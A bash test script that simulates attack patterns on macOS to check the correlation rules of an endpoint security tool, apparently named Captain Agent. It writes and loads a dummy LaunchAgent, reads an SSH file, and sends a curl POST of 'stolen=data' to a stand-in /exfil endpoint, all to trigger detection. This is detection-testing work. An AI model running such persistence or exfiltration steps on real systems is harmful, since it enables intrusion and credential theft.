#!/usr/bin/env bash
# Trigger compound patterns to test Slice 4 correlation rules.
#
# Targets:
#  • download-and-launchagent-injection  — write LaunchAgent THEN launchctl load
#  • credential-exfil-suspect           — read SSH file THEN curl POST (only
#                                          fires if file_read events work,
#                                          which on macOS 16 doesn't yet)
#
# Run with Captain Agent helper running. Each compound takes ≤60s.

set -uo pipefail

echo "── COMPOUND 1: download-and-launchagent-injection (within 60s) ──"

echo "[1a] Write user LaunchAgent..."
LA="$HOME/Library/LaunchAgents/com.captaintest.corr.$(date +%s).plist"
cat > "$LA" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict><key>Label</key><string>fake-corr</string></dict></plist>
EOF

sleep 2

echo "[1b] Call launchctl load on it (will fail but cmdline matches rule)..."
( bash -c "launchctl load \"$LA\" 2>&1; sleep 3" ) &
sleep 4
rm -f "$LA"
echo "✓ Expect: mac-user-launchagent-write (high) + launchctl-load-unfamiliar (high) + "
echo "         download-and-launchagent-injection (critical, correlation)"

echo
echo "── COMPOUND 2: credential-exfil-suspect (within 30s) ──"
echo "   Note: needs file_read events which macOS 16 ES FIM doesn't emit."
echo "         This compound will only LOG the curl POST single-event today."

echo "[2a] Read SSH file (write doesn't fire ssh-private-key-read but read does)..."
( cat ~/.ssh/known_hosts > /dev/null 2>&1 || true; sleep 3 ) &

sleep 2

echo "[2b] curl POST..."
( curl -X POST --connect-timeout 4 -d "stolen=data" \
    https://example.com:8443/exfil 2>/dev/null; true ) &

sleep 6

echo
echo "✓ Done. Check Captain Agent Findings tab in next few seconds:"
echo "  Expected correlation finding: download-and-launchagent-injection"
echo "  Expected to ALSO see a macOS notification pop up for critical findings"
